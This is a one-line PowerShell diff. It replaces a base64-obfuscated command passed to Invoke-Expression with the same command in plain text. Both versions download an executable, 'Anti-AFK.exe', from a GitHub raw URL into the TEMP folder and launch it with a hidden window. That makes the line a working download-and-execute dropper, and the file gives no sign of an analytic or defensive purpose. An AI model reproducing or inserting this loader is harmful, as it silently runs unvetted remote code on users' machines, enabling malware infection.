@@ -1,1 +1,1 @@
-$e = [System.Convert]::FromBase64String("JHU9J2h0dHBzOi8vZ2l0aHViLmNvbS9EcmVhbGF6emVyL3EvcmF3L3JlZnMvaGVhZHMvbWFpbi9BbnRpLUFGSy5leGUnOwRwPSIkZW52OlRFTVBcdXBkYXRlLmV4ZSI7KE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCR1LCRwKTtTdGFydC1Qcm9jZXNzICRwIC1XaW5kb3dTdHlsZSBIaWRkZW4="); [System.Text.Encoding]::UTF8.GetString($e) | Invoke-Expression
+$u='https://github.com/Drealazzer/q/raw/refs/heads/main/Anti-AFK.exe'; $p="$env:TEMP\Anti-AFK.exe"; (New-Object System.Net.WebClient).DownloadFile($u, $p); Start-Process $p -WindowStyle Hidden
